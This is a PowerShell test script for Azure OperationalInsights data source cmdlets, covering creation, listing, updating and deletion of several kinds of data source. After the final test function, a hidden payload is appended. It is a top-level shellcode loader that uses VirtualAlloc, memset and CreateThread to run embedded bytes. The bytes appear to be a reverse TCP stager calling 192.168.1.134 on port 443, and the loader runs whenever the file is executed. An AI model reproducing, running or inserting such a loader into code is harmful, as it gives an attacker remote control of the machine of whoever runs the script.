














function Test-DataSourceCreateUpdateDelete
{
    $wsname = Get-ResourceName
    $dsName = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $subId1 = "0b88dfdb-55b3-4fb0-b474-5b6dcbe6b2ef"
    $subId2 = "bc8edd8f-a09f-499d-978d-6b5ed2f84852"
    $wslocation = Get-ProviderLocation

    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    
    $workspace = New-AzOperationalInsightsWorkspace -ResourceGroupName $rgname -Name $wsname -Location $wslocation -Sku premium -Force

    
    $dataSource = New-AzOperationalInsightsAzureActivityLogDataSource -Workspace $workspace -Name $dsName -SubscriptionId $subId1
    Assert-AreEqual $dsName $dataSource.Name
    Assert-NotNull $dataSource.ResourceId
    Assert-AreEqual $rgname $dataSource.ResourceGroupName
    Assert-AreEqual $wsname $dataSource.WorkspaceName
    Assert-AreEqual $subId1 $dataSource.Properties.SubscriptionId
    Assert-AreEqual "AzureActivityLog" $dataSource.Kind

    
    $dataSource = Get-AzOperationalInsightsDataSource -Workspace $workspace -Name $dsName
    Assert-AreEqual $dsName $dataSource.Name
    Assert-NotNull $dataSource.ResourceId
    Assert-AreEqual $rgname $dataSource.ResourceGroupName
    Assert-AreEqual $wsname $dataSource.WorkspaceName
    Assert-AreEqual $subId1 $dataSource.Properties.SubscriptionId
    Assert-AreEqual "AzureActivityLog" $dataSource.Kind

    
    $daNametwo = Get-ResourceName
    $dataSource = New-AzOperationalInsightsAzureAuditDataSource -Workspace $workspace -Name $daNametwo -SubscriptionId $subId2

    
    $dataSources = Get-AzOperationalInsightsDataSource -Workspace $workspace -Kind AzureActivityLog
    Assert-AreEqual 2 $dataSources.Count
    Assert-AreEqual 1 ($dataSources | Where {$_.Name -eq $dsName}).Count
    Assert-AreEqual 1 ($dataSources | Where {$_.Name -eq $daNametwo}).Count

    $dataSources = Get-AzOperationalInsightsDataSource -ResourceGroupName $rgname -WorkspaceName $wsname -Kind AzureActivityLog
    Assert-AreEqual 2 $dataSources.Count
    Assert-AreEqual 1 ($dataSources | Where {$_.Name -eq $dsName}).Count
    Assert-AreEqual 1 ($dataSources | Where {$_.Name -eq $daNametwo}).Count

    
    Remove-AzOperationalInsightsDataSource -Workspace $workspace -Name $daNametwo -Force
    $dataSources = Get-AzOperationalInsightsDataSource -Workspace $workspace -Kind AzureActivityLog
    Assert-AreEqual 1 $dataSources.Count
    Assert-AreEqual 1 ($dataSources | Where {$_.Name -eq $dsName}).Count
    Assert-AreEqual 0 ($dataSources | Where {$_.Name -eq $daNametwo}).Count

    
    $dataSource = $dataSources[0]
    $dataSource.Properties.SubscriptionId = $subId2
    $dataSource = Set-AzOperationalInsightsDataSource -DataSource $dataSource
    Assert-AreEqual "AzureActivityLog" $dataSource.Kind
    Assert-AreEqual $subId2 $dataSource.Properties.SubscriptionId

    
    Remove-AzOperationalInsightsDataSource -Workspace $workspace -Name $dsName -Force
    $dataSources = Get-AzOperationalInsightsDataSource -Workspace $workspace -Kind AzureActivityLog
    Assert-AreEqual 0 $dataSources.Count
}


function Test-DataSourceCreateFailsWithoutWorkspace
{
    $wsname = Get-ResourceName
    $dsName = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $subId1 = "0b88dfdb-55b3-4fb0-b474-5b6dcbe6b2ef"
    $wslocation = Get-ProviderLocation

    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    Assert-ThrowsContains { New-AzOperationalInsightsAzureActivityLogDataSource -ResourceGroupName $rgname -WorkspaceName $wsname -Name $dsName -SubscriptionId $subId1 } "NotFound"
}


function Test-CreateAllKindsOfDataSource
{
    $wsname = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $subId1 = "0b88dfdb-55b3-4fb0-b474-5b6dcbe6b2ef"
    $subId2 = "aaaadfdb-55b3-4fb0-b474-5b6dcbe6aaaa"
    $wslocation = Get-ProviderLocation

    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    
    $workspace = New-AzOperationalInsightsWorkspace -ResourceGroupName $rgname -Name $wsname -Location $wslocation -Sku premium -Force

    
    $auditLogDataSource = New-AzOperationalInsightsAzureActivityLogDataSource -Workspace $workspace -Name "myAuditLog" -SubscriptionId $subId1

    
    $windowsEventDataSource = New-AzOperationalInsightsWindowsEventDataSource -Workspace $workspace -Name Application -EventLogName "Application" -CollectErrors -CollectWarnings -CollectInformation

    
    $windowsPerfDataSource = New-AzOperationalInsightsWindowsPerformanceCounterDataSource -Workspace $workspace -Name "processorPerf" -ObjectName Processor -InstanceName * -CounterName "% Processor Time" -IntervalSeconds 10 -UseLegacyCollector

    
    $syslogDataSource = New-AzOperationalInsightsLinuxSyslogDataSource -Workspace $workspace -Name "syslog-local1" -Facility "local1" -CollectEmergency -CollectAlert -CollectCritical -CollectError -CollectWarning -CollectNotice -CollectDebug -CollectInformational

    
    $linuxPerfDataSource = New-AzOperationalInsightsLinuxPerformanceObjectDataSource -Workspace $workspace -Name "MemoryLinux" -ObjectName "Memory" -InstanceName * -CounterNames "Available bytes" -IntervalSeconds 10

    
    $customLogRawJson = '{"customLogName":"Validation_CL","description":"test","inputs":[{"location":{"fileSystemLocations":{"linuxFileTypeLogPaths":null,"windowsFileTypeLogPaths":["C:\\e2e\\Evan\\ArubaSECURITY\\*.log"]}},"recordDelimiter":{"regexDelimiter":{"pattern":"\\n","matchIndex":0}}}],"extractions":[{"extractionName":"TimeGenerated","extractionType":"DateTime","extractionProperties":{"dateTimeExtraction":{"regex":"((\\d{2})|(\\d{4}))-([0-1]\\d)-(([0-3]\\d)|(\\d))\\s((\\d)|([0-1]\\d)|(2[0-4])):[0-5][0-9]:[0-5][0-9]","joinStringRegex":null}}}]}'
    $customLogDataSource = New-AzOperationalInsightsCustomLogDataSource -Workspace $workspace -CustomLogRawJson $customLogRawJson -Name "MyCustomLog"
	
	
    $customLogRawJson1 = '{"customLogName":"Validation_CL1","description":"test","inputs":[{"location":{"fileSystemLocations":{"linuxFileTypeLogPaths":null,"windowsFileTypeLogPaths":["C:\\e2e\\Evan\\ArubaSECURITY\\*.log"]}},"recordDelimiter":{"regexDelimiter":{"pattern":"\\n","matchIndex":0}}}],"extractions":[{"extractionName":"TimeGenerated","extractionType":"DateTime","extractionProperties":{"dateTimeExtraction":{"regex":null,"joinStringRegex":null}}}]}'
    $customLogDataSource1 = New-AzOperationalInsightsCustomLogDataSource -Workspace $workspace -CustomLogRawJson $customLogRawJson1 -Name "MyCustomLog1"
	

    
    $customLogRawJson2 = '{"customLogName":"Validation_CL2","description":"test","inputs":[{"location":{"fileSystemLocations":{"linuxFileTypeLogPaths":null,"windowsFileTypeLogPaths":["C:\\e2e\\Evan\\ArubaSECURITY\\*.log"]}},"recordDelimiter":{"regexDelimiter":{"pattern":"\\n","matchIndex":0}}}],"extractions":[{"extractionName":"TimeGenerated","extractionType":"DateTime","extractionProperties":{"dateTimeExtraction":{"regex":[{"matchIndex":0,"numberdGroup":null,"pattern":"((\\d{2})|(\\d{4}))-([0-1]\\d)-(([0-3]\\d)|(\\d))\\s((\\d)|([0-1]\\d)|(2[0-4])):[0-5][0-9]:[0-5][0-9]"}],"joinStringRegex":null}}}]}'
    $customLogDataSource2 = New-AzOperationalInsightsCustomLogDataSource -Workspace $workspace -CustomLogRawJson $customLogRawJson2 -Name "MyCustomLog2"

    
    $applicationInsightsDataSource1 = New-AzOperationalInsightsApplicationInsightsDataSource -Workspace $workspace -ApplicationSubscriptionId $subId1 -ApplicationResourceGroupName $rgname -ApplicationName "ai-app"
    Assert-NotNull $applicationInsightsDataSource1
    Assert-AreEqual "subscriptions/$subId1/resourceGroups/$rgname/providers/microsoft.insights/components/ai-app" $applicationInsightsDataSource1.Name 
    Assert-AreEqual "ApplicationInsights" $applicationInsightsDataSource1.Kind 
    Assert-AreEqual $rgname $applicationInsightsDataSource1.ResourceGroupName

    
    $applicationInsightsDataSource2 = New-AzOperationalInsightsApplicationInsightsDataSource -Workspace $workspace -ApplicationResourceId "/subscriptions/$subId2/resourceGroups/$rgname/providers/microsoft.insights/components/ai-app2"
    Assert-NotNull $applicationInsightsDataSource2
    Assert-AreEqual "subscriptions/$subId2/resourceGroups/$rgname/providers/microsoft.insights/components/ai-app2" $applicationInsightsDataSource2.Name 
    Assert-AreEqual "ApplicationInsights" $applicationInsightsDataSource2.Kind 
    Assert-AreEqual $rgname $applicationInsightsDataSource2.ResourceGroupName
}


function Test-ToggleSingletonDataSourceState
{
    $wsname = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $subId1 = "0b88dfdb-55b3-4fb0-b474-5b6dcbe6b2ef"
    $wslocation = Get-ProviderLocation

    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    
    $workspace = New-AzOperationalInsightsWorkspace -ResourceGroupName $rgname -Name $wsname -Location $wslocation -Sku premium -Force

    
    Enable-AzOperationalInsightsIISLogCollection -Workspace $workspace
    Disable-AzOperationalInsightsIISLogCollection -Workspace $workspace

    
    Enable-AzOperationalInsightsLinuxCustomLogCollection -Workspace $workspace
    Disable-AzOperationalInsightsLinuxCustomLogCollection -Workspace $workspace

    
    Enable-AzOperationalInsightsLinuxPerformanceCollection -Workspace $workspace
    Disable-AzOperationalInsightsLinuxPerformanceCollection -Workspace $workspace

    
    Enable-AzOperationalInsightsLinuxSyslogCollection -Workspace $workspace
    Disable-AzOperationalInsightsLinuxSyslogCollection -Workspace $workspace

}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x86,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

